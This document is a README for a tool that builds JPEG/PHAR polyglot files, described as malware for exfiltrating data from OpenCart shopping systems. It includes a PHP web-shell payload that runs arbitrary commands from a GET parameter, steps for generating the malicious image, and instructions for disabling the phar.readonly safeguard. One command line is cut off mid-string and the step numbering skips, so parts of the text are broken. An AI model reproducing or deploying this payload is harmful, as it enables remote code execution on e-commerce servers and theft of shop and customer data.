# JPEG PHAR OpenCart-Malware generator

This is a simple tool to add a malicious phar payload at the end of a valid jpeg image to exfilter data from an Opencart shopping system!

It is based on a fork of the Repo Sarapuce/jpeg-phar-fusion.

It is only meant to be a learning to for Cybersecurity Student! Be Ethical!

## Requirements
- Python 3
- Php (Tested with php 8)

## Usage

2. Choose a php payload finishing by `__HALT_COMPILER();` for example :

`<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>`

3. Create the payload with the script

`python3 phar_creator.py '

4. The generated PHAR/JPEG polyglot file is called `malicious.jpg`

5. Run "php include.php" to see the code executed!!


## It doesn't work 😡
Do you have the error 
> PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "payload.phar" disabled by the php.ini setting phar.readonly

You need to enable the phar creation in php.ini

To locate your php.ini 

`php --ini`

Then edit this line in your file

`;phar.readonly = Off`

into

`phar.readonly = Off`
